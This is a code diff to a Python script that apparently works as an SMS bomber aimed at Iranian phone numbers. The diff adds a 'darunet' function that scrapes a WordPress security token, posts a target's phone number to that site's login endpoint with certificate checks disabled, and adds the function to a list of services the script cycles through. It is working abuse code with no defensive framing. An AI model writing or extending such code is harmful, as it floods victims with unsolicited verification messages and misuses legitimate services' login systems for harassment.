@@ -142,12 +142,30 @@ def bimeh(phone):
     except Exception as e:
         print(f"Error: {e}")
         return False
-        
+
+
+def darunet(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        s = requests.Session()
+        res = s.get("https://darunet.com/my-account/", headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
+        token = re.search(r'security["\']\s*[:=]\s*["\']([^"\']+)["\']', res.text)
+        if not token: return False
+        r = s.post("https://darunet.com/wp-admin/admin-ajax.php", 
+                   data={"action": "voorodak__submit-username", "username": phone, "security": token.group(1)}, 
+                   headers={"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, 
+                   timeout=10, verify=False)
+        print(f"[Darunet] {'Success' if r.status_code == 200 and 'success' in r.text.lower() else r.text}")
+        return r.status_code == 200 and 'success' in r.text.lower()
+    except Exception as e:
+        print(f"[Darunet] Error: {e}")
+        return False
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet
 ]
 
 # ==========================
